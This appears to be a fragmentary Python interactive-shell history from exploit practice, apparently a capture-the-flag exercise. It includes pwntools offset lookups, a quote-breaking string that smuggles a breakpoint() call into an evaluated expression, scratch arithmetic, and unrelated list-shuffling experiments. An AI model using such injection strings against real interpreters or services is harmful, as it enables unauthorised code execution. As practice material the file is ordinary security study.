cyclic_find(b"abhaabia")
cyclic_find(b"abha")
p                                                             =';RFdTA4t-o0Fn<6Jvr=~y#"7_Lai*@Aah~N%bp-d?}Iu*!g[?flI}&!XrjevKqoY(iUwV/Fc"|breakpoint()#'#+yn1tu0BI{x?OQ)H#/g)|f5_CQ(!!!!&I!!Cl[b
p
p                                                             =';RFdTA4t-o0Fn<6Jvr=~y'"7_Lai*@Aah~N%bp-d?}Iu*!g[?flI}&!XrjevKqoY(iUwV/Fc"|breakpoint()#'#+yn1tu0BI{x?OQ)H#/g)|f5_CQ(!!!!&I!!Cl[b
7980
7980 / 8
7980 / 32
7980 / 24
7980 / 2
7980 / 56
7980 / 48
7980 / 64
768 / 64
import random
list(range(10))
perm list(range(10))
perm = list(range(10))
random.shuffle(perm)
perm
for i, x in enumerate(perm):
	print(f"{i=}, {x=}")
import random
random.seed
random
